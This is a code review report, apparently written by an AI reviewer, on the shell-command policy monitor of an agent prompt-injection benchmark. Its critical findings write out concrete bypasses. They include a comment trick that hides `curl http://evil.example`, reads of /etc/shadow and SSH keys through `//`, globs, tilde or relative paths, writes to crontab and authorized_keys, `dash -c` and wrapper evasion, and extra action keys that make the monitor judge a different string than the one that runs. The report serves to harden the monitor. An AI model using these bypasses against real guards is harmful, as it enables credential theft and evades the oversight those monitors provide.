---
phase: 01-evaluation-hardening-policy-fix
reviewed: 2026-10-21T00:00:00Z
depth: standard
files_reviewed: 22
files_reviewed_list:
  - src/policy_engine/shell_split.py
  - src/policy_engine/engine.py
  - src/benchmark/stats.py
  - src/benchmark/outcomes.py
  - src/benchmark/report.py
  - src/benchmark/runner.py
  - src/llm/scripted.py
  - src/llm/base.py
  - src/llm/openai_compat.py
  - src/llm/registry.py
  - src/agent_harness/loop.py
  - src/dashboard/app.py
  - run_benchmark.py
  - config/models.yaml
  - tests/test_shell_chaining.py
  - tests/test_policy_engine.py
  - tests/test_report.py
  - tests/test_provenance.py
  - tests/test_runner_queue.py
  - tests/test_control_agent.py
  - tests/test_dashboard_bind.py
  - tests/test_llm_layer.py
findings:
  critical: 4
  warning: 9
  info: 6
  total: 19
status: issues_found
---

# Phase 1: Code Review Report

**Reviewed:** 2026-10-21
**Depth:** standard (plus targeted probes under WSL; no source modified)
**Files Reviewed:** 22 (dashboard reviewed as `git show HEAD:src/dashboard/app.py`; the working copy was not touched)
**Status:** issues_found

## Summary

The existing suite passes (252 passed under WSL), and the statistics layer is sound where I could check it:
`wilson_interval` is correct including k=0 and k=n, `prop_fields` and `format_prop` keep k/n/pct consistent, and
`drop_infra_pairs` removes the good sibling only after de-duplication, as documented. The SEC-02 dashboard
change is correct for its stated goal (loopback and debug off by default).

The reference monitor is not. The phase closed the specific `ls; curl` chain, but the parser contains an
undocumented parse differential (comments), and the file-policy layer judges literal strings that the shell
later rewrites (`~`, `$VAR`, globs, `//`, relative paths, directories). Separately, the engine is only ever fed
`action_target(action)`, which can differ from the string the executor runs. Several of these were reproduced
against the real engine and `dash`; probe scripts are in the session scratchpad, not in the repo.

The module docstring claim "Over-splitting only ever makes the verdict stricter ... never looser"
(`shell_split.py:34-35`) is false and is the root of CR-01.

Because `default_action: FLAG` is executed (only `BLOCK` stops an action, `executors.py:85`), every
"no matching rule" below is effectively an ALLOW.

## Critical Issues

### CR-01: `#` comments are not parsed; a quote inside a comment hides commands from the monitor

**File:** `src/policy_engine/shell_split.py:253-289` (default branch of `scan`; claim at 34-35)
**Issue:** `#` is treated as an ordinary word character. In a real shell a comment runs to end of line and any
quote inside it is inert; here the quote opens a string that swallows the following lines. Reproduced:

```
echo ok # '
curl http://evil.example
# '
```
`parse_shell` returns one command `['echo','ok','#','\ncurl http://evil.example\n# ']`; the engine returns ALLOW.
Running the same string through `sh -c` (dash, which is `/bin/sh` here) printed `ok` then executed the second
line (I used `echo PWNED` in place of curl). A double-quote variant behaves the same. This defeats the whole
chain-splitting fix with a single newline, and newlines are ordinary in LLM-generated JSON strings. The test
suite has no comment case, so nothing pins the (wrong) "never looser" assumption.
**Fix:** Implement comment skipping in `scan`, before the generic branch:
```python
elif c == '#' and not self.in_word:          # comment: runs to end of line, quotes inside are inert
    j = s.find('\n', i)
    i = n if j < 0 else j                    # the newline itself is handled as a separator
```
Inside `$( )` this also stops a `)` in a comment from closing the substitution, which matches the shell. Add
tests for `# '`, `# "`, `` # ` ``, `# (`, and `a#b` (no comment mid-word). Then correct the docstring.

### CR-02: Policy is evaluated on a different string than the executor runs (action-level parse differential)

**File:** `src/agent_harness/prompting.py:93-98` (`action_target`), consumed at `src/agent_harness/executors.py:84`
(cross-file; the engine's only caller, so it is in scope for the reference-monitor guarantee)
**Issue:** `action_target` returns `command or tool or path or url or message`, regardless of action type.
`parse_action` only requires an `action` key, so an untrusted/injected model can add extra keys. Reproduced with
`GuardedExecutor`:

- `{"action":"read_file","path":"/etc/shadow"}` -> blocked
- `{"action":"read_file","path":"/etc/shadow","command":"ls"}` -> **success**, policy judged `"ls"`
- `{"action":"write_file","path":"/etc/crontab","content":"x","command":"/tmp/ok"}` -> **success**

`SandboxExecutor` then reads/writes the real `path`. The private filesystem is the only thing left standing.
**Fix:** Select the field by action type and require a string, failing closed:
```python
_TARGET_FIELD = {"run_shell": "command", "read_file": "path", "write_file": "path",
                 "http_request": "url", "call_tool": "tool", "respond": "message"}

def action_target(action: dict) -> str:
    value = action.get(_TARGET_FIELD.get(action.get("action"), ""), "")
    if not isinstance(value, str):
        raise ActionParseError("action target is not a string", "")   # or return a sentinel the engine BLOCKs
    return value
```
Also have the executors read the same field the policy checked (single accessor), and add a test with the extra
`command`/`tool` keys.

### CR-03: File policy checks only literal absolute strings; everything the shell rewrites is invisible to it

**File:** `src/policy_engine/engine.py:167-177, 209-216, 229`
**Issue:** `_check_command_file_args` and the redirect checks only look at arguments that start with `/`, and
`_check_filesystem` only runs `os.path.normpath` plus `fnmatch`. The shell expands or resolves far more than
that. Reproduced against the real engine (all returned ALLOW, or FLAG which executes):

- `cat //etc/shadow`, `cat < //etc/shadow`, `read_file //etc/shadow` (POSIX `normpath` keeps a leading `//`)
- `cat /etc/sha*`, `cat /etc/sh[a]dow`, `cat /*/shadow`, `cat /etc/shadow-`
- `cat ~/.ssh/id_rsa`, `echo x > ~/.bashrc` (tilde is expanded by the shell, also in redirects)
- `cat ../../../etc/shadow`, `echo x > ../../etc/cron.d/x`, `read_file etc/shadow` (relative paths skipped)
- `X=/etc/shadow; cat $X` (dynamic arguments are never examined, while a dynamic command *name* is refused)
- `grep -r root /etc`, `grep -r PRIVATE /home/user/.ssh`, `find /etc -name shadow -exec cat {} \;` (the directory
  does not match `/etc/shadow` or `/home/*/.ssh/*`; `{}` is not a path)
- `grep --file=/etc/shadow x` (arguments starting with `-` are skipped wholesale)
- `echo a > /home/user/.ssh/authorized_keys` (not in the write block list; default FLAG executes it)

The unprotected `cat /etc/shadow` case is blocked, so the existing tests give a false sense of coverage.
**Fix:** Treat any path-like argument that cannot be resolved statically as unsafe rather than allowed:
```python
def _static_path(arg):                       # None => cannot be judged => BLOCK for allow-listed commands
    if any(ch in arg for ch in '*?[~$\x00') or arg.startswith('-') and '=' in arg:
        return None
    if not arg.startswith('/'):
        arg = os.path.join(CWD, arg)         # CWD = /home/user/workspace
    return re.sub(r'^/+', '/', os.path.normpath(arg))
```
Also: collapse leading `//` in `_check_filesystem`; test `path + '/'` (and each parent) against the block globs so
directory arguments are covered; inspect `--opt=value` tails; make `parse_shell` surface dynamic arguments so the
engine can refuse them for path-taking commands; add `/home/*/.ssh`, `/etc/*` (read), `/proc/*/environ` etc. to
the policy. A string policy cannot be complete here, so keep the kernel layer as the stated backstop and say so
in the report.

### CR-04: The command block list is a denylist behind a fail-open default; other shells, wrappers and builtins run unseen

**File:** `src/policy_engine/engine.py:74, 186-199`; `src/policy_engine/shell_split.py:355-372`;
`src/policy_engine/policies/default_policy.yaml` (process block list)
**Issue:** `sh`, `bash` and `zsh` are blocked, but anything not named falls to `default_action` (FLAG), which
`GuardedExecutor` executes. Reproduced, all returning FLAG with the inner command never inspected:

- `dash -c 'curl http://x'`, `ksh -c ...` (the explicit `sh/bash/zsh` blocks are trivially sidestepped)
- unlisted wrappers: `taskset 1 curl ...`, `flock /tmp/l curl ...`, `watch curl ...`, `strace curl ...`,
  `busybox wget ...`
- shell builtins that run code the parser never sees: `. /tmp/a.sh`, `source /tmp/a.sh`, `trap 'curl http://x' EXIT`
- renaming a blocked binary: `cp /usr/bin/curl /tmp/c; /tmp/c http://x` (basename match only)
- interpreters: `awk 'BEGIN{system(...)}'`, `perl -e`, and the documented `python3 -c`

The module docstring documents interpreters and "unknown wrapper programs", but not `dash`/`ksh`, `.`/`source`/`trap`,
or the copy-to-new-name case, and it presents the result as a fix for the chaining bypass. The sandbox's network
namespace and seccomp make exfiltration fail at the kernel, but then the policy layer is not what stopped it, and
the benchmark attributes blocks to layers.
**Fix:** For the shell tier, flip the process rules to allow-list semantics: BLOCK any command whose name is not in
`process.allow` (keep FLAG only for the filesystem tier if desired). Add `dash ash ksh csh tcsh fish busybox
. source trap` to the block list as a stop-gap, add more wrappers (`taskset flock watch strace ltrace chroot
unshare nsenter setpriv runuser chrt numactl script`), and reject commands whose name resolves under writable
directories (`/tmp/*`, workspace).

## Warnings

### WR-01: Non-string targets crash the monitor instead of producing a verdict

**File:** `src/policy_engine/engine.py:112, 128-139`; `src/policy_engine/shell_split.py:86-91`
**Issue:** `parse_action` does not validate value types, so `{"action":"run_shell","command":["ls","-la"]}` (a very
natural small-model output) reaches `parse_shell(list)`. Reproduced: `None` -> `TypeError`, `5` -> `TypeError`,
`["curl","x"]` -> `AttributeError`, `{"a":1}` -> `KeyError`. Only `ShellParseError` is caught. The exception
unwinds through `GuardedExecutor` and `AgentLoop` and aborts the whole benchmark run. It fails closed today only
because nothing wraps it; a future `try/except Exception` caller would turn it into allow.
**Fix:** In `check_detailed`, `if not isinstance(target, str): return ("BLOCK", "Non-text action target (fail closed)")`
and log it. Treat the same case in `_normalize` for read/write/http targets (`os.path.normpath(None)` also raises).

### WR-02: Block rules are raw string prefixes: `pip install` is bypassed by any option, and `sh`/`su`/`nc` over-match

**File:** `src/policy_engine/engine.py:182-188`
**Issue:** `full.startswith(blocked)` is used for every rule. (a) `pip -q install evil` and `pip --user install evil`
do not start with `pip install`, and `pip` is allow-listed, so they are ALLOWED (confirmed; `pip install evil` is
BLOCKED). (b) `sha256sum`, `shuf` and `sum` are BLOCKED because they start with `sh`/`su`, and `ncdu`, `rmdir`,
`ddrescue`, `sshd` likewise. Over-blocking raises the benchmark's `false_positive` rate on benign tasks and blames
the policy for something unrelated.
**Fix:** Match on token boundaries and, for multi-word rules, on subsequence: split the rule, compare
`argv[0]`'s basename to the first token, and require the remaining tokens to appear in order among the
non-option arguments. Add tests for `pip -q install`, `sha256sum`, `sum`.

### WR-03: `env` option parsing lets the real command hide behind an unrecognized option

**File:** `src/policy_engine/shell_split.py:340-352`
**Issue:** Any option other than `-S`/`-u`/`-C` is assumed to take no value, and `-S` is matched only as a prefix. So
`env -a x curl http://x` parses as command `x` (FLAG) while `env` runs curl; I confirmed `env -a x echo ARGV0`
executes `echo` under this machine's env. `env -iS ' curl http://x'` (combined short options; the leading space also
defeats the `startswith('curl')` rescue) and GNU's unambiguous abbreviation `env --split='curl ...'` also parse as
harmless (parser level confirmed; whether they execute depends on the env implementation, this host runs uutils).
**Fix:** Allow-list the options `env` is known to take and `raise ShellParseError` for any other `-...` token, and
scan combined short-option clusters for `S`. Apply the same "unknown option -> fail closed" rule to the other
wrapper handlers.

### WR-04: "Blocked given attempt" counts episodes where the attack succeeded or an unrelated action was blocked

**File:** `src/benchmark/report.py:108-109, 207-209`
**Issue:** `blocked_p` is any attempted protected attack episode whose `blocked_by` dict is non-empty. `blocked_by`
records any blocked step, not the attack step. An episode where the attacker tool was allowed and the harm
happened, but a later unrelated shell call was blocked, is counted as "blocked" and is also counted in
"Succeeded despite guardrails". The report's columns therefore do not partition the attempted episodes, and the
headline guardrail effectiveness is inflated (the markdown and the 01-01 definition document the rule, but the
metric name promises more than it measures).
**Fix:** Either define blocked as `blocked_by and not succeeded`, or record the attack step's own outcome in
`score_episode` (`attack_blocked`) and use that. At minimum show blocked-and-succeeded as its own column.

### WR-05: Wilson intervals assume independent episodes, but each case is repeated at temperature 0

**File:** `src/agent_harness/loop.py:54` (`temperature=0.0`), `src/benchmark/report.py:158-174, 468`; `src/benchmark/stats.py`
**Issue:** Each case is run 3 times with `temperature=0.0`, and the scripted control is fully deterministic. The three
runs are near-duplicate replicates, so `n` is roughly 3x the effective sample size and the printed 95% intervals are
too narrow. The pooled row additionally adds episodes across models. Wilson over-claims precision; the headline
"[lo, hi]" is exactly what a reader will quote.
**Fix:** Cluster by case: either report the interval over per-case outcomes (a case counts once, with a fractional or
majority value), or state in `summary.md` that runs are not independent and the interval is a lower bound on the
uncertainty. For the control, report n as the number of distinct cases.

### WR-06: Provider-refusal regex misses `PROHIBITED_CONTENT`, so refusals are retried as infra errors and the good sibling arm is dropped

**File:** `src/benchmark/outcomes.py:31`
**Issue:** The pattern has `prohibited content` with a space; Gemini block reasons use the enum form
`PROHIBITED_CONTENT`. Such an error is classified `infra`, re-queued (burning quota), and `drop_infra_pairs` removes
the other arm of the pair. This systematically deletes pairs where the model refused to process the injected prompt,
which biases ASR upward and hides provider refusals from the `refused` column.
**Fix:** `re.compile(r"content[_ ]filter|safety|prohibited[_ ]content|blocklist|responsible.?ai", re.I)` and add
tests with the enum spellings of each provider you use.

### WR-07: A truncated `raw.jsonl` line makes `--resume` crash, although the report loader tolerates it

**File:** `src/benchmark/runner.py:182-187`
**Issue:** `json.loads(line)` has no `try`, and a blank line also raises. `report.load_rows_counted` explicitly handles a
"run killed mid-write" line, but the runner, the one place that must survive that kill, does not. Resume is the
documented recovery path and the partial line is exactly what a kill leaves. If the user trims the fragment but
leaves no trailing newline, the next appended row is glued to it and silently becomes an undecodable line.
**Fix:** Reuse `load_rows_counted`-style tolerance in the resume scan (skip and count bad lines), and before the first
append, ensure the file ends with `\n`. Add a runner test with a truncated final line.

### WR-08: Resume does not verify its arguments; the manifest and "complete" gate follow whatever the latest invocation passed

**File:** `src/benchmark/runner.py:153-171`; `run_benchmark.py:61, 70`
**Issue:** `expected_episodes_per_model`, `cases`, `runs`, `arms` and `max_steps` are overwritten on every invocation, and
`main()` always passes an explicit `expected=` computed from the current CLI args, so the manifest value is never
consulted after a run. Resuming with different `--dh/--ds/--runs/--seed/--arms` silently mixes case sets, shifts the
"complete" threshold, and records only the latest plan. `--arms` is also unvalidated: `build_executor` treats any
value other than `unprotected` as the protected stack, so `--arms unprotcted,protected` runs the sandbox under a
mislabeled arm and produces empty arm columns. A misspelled `--resume` directory silently creates a new one.
**Fix:** On resume, load the existing manifest and refuse (or require `--force`) if cases, runs, arms, seed or
max_steps differ; validate `arms` against `ARMS`; require the `--resume` directory to exist.

### WR-09: Dashboard hardening gaps beside the new bind default

**File:** `src/dashboard/app.py` (HEAD) `_run_settings` and `POST /api/clear`
**Issue:** (a) `DASHBOARD_DEBUG=1` together with `DASHBOARD_HOST=0.0.0.0` re-creates exactly the exposure SEC-02 removed
and is accepted silently apart from a banner. (b) `POST /api/clear` takes no body and no token: any web page the user
visits can issue a cross-site "simple" POST to `127.0.0.1:5000` and wipe the decision log, and Flask does not validate
the `Host` header, so DNS rebinding also reads `/api/logs`. (c) `int(os.environ.get('DASHBOARD_PORT'))` raises an
unhandled `ValueError` on a bad value.
**Fix:** Refuse debug on a non-loopback host (`sys.exit` with a message), require a custom header
(`X-Requested-With`) or a per-process token on `/api/clear`, reject unexpected `Host` values, and wrap the port parse.

## Info

### IN-01: Rate-limit detection by the substring `"429"`

**File:** `src/benchmark/runner.py:56`
**Issue:** `"429" in error` matches any message containing those digits (token counts, ids, ports). A false match sleeps
through the whole backoff schedule (about 36 minutes) and then raises `QuotaExhausted`, stopping that model.
**Fix:** `re.search(r"\b429\b", error)`, or read the status code from the exception rather than the text.

### IN-02: A non-text `final_message` aborts the run in `record()`

**File:** `src/benchmark/runner.py:206`; `src/agent_harness/loop.py:90`
**Issue:** `{"action":"respond","message":null}` (or a dict) sets `final_message` to a non-string; `final_message[:500]`
then raises `TypeError` and kills the benchmark. At temperature 0 a resume repeats the same reply.
**Fix:** In `AgentLoop`, `str(step.action.get("message") or "")`; in `record`, `str(...)[:500]`.

### IN-03: Raw provider error text and decision targets are stored unredacted in results meant to be committed

**File:** `src/benchmark/runner.py:200-215`, `src/llm/openai_compat.py:48-49`, `src/policy_engine/engine.py:264-275`
**Issue:** `llm_error` is `f"{type(e).__name__}: {e}"` from the SDK (server-controlled body) written whole into
`raw.jsonl`; `.gitignore` says final `results/` runs are committed. The manifest is clean (fixed field list) and the
sandbox environment is minimal, which is good. The residual risk is a provider echoing a key fragment or request id
in an error. `decisions.jsonl` also records every command and URL verbatim.
**Fix:** Redact the values of every configured `api_key_env` and truncate `llm_error` (for example to 300 chars)
before writing; scan `results/` for key-shaped strings before committing.

### IN-04: Retried infra errors disappear from the report; narrative claims in the control section are static

**File:** `src/benchmark/report.py:53-54, 137, 258-265`
**Issue:** Deduplication keeps the first error-free record, so `infra_errors`/`llm_errors` only count keys that never
succeeded; the retry history is invisible. `_control_lines` also prints fixed sentences ("no action by this control
reaches the sandbox or seccomp layers", "Phase 4 (EVAL-08)") that are true of today's data, not asserted from it, and
leak a planning ID into a reader-facing report.
**Fix:** Count error rows before deduplication and report them (`retried_ok`), and generate the layer sentence from
`layers[...]` or drop it.

### IN-05: Smaller engine/parser items

**File:** `src/policy_engine/engine.py:63-65, 72, 186-191`; `src/policy_engine/shell_split.py:147-148, 276`
**Issue:** `sys.exit(1)` inside a library constructor; `yaml.safe_load` returning `None` (empty policy) or a null
`block:` list raises `AttributeError`/`TypeError`; the sub-command text for a substitution is cut at the first `)`
(`cat "$(echo /etc/shadow` in the BLOCK reason); `$(( a << 2 ))` is refused as a here-document (over-block);
`count = len(done)` in the runner counts rows of all models, inflating the progress counter.
**Fix:** Raise exceptions instead of exiting, validate the policy shape at load, and pass the real end index for
nested commands.

### IN-06: Test gaps that let the above through

**File:** `tests/test_shell_chaining.py`, `tests/test_policy_engine.py`, `tests/test_runner_queue.py`
**Issue:** No test covers comments, tilde/relative/glob/`//` paths, dynamic arguments, extra action keys, non-string
targets, `pip -q install`, prefix over-match, `env -a`, `dash -c`, or a truncated line on resume. The suite validates
the cases that were fixed, not the property "parsed command set equals what `sh` runs".
**Fix:** Add a differential test that runs a corpus of strings through `dash` with a tracing stub on `PATH` and
asserts every executed command name appears in `parse_shell(...)`.

---

_Reviewed: 2026-10-21_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
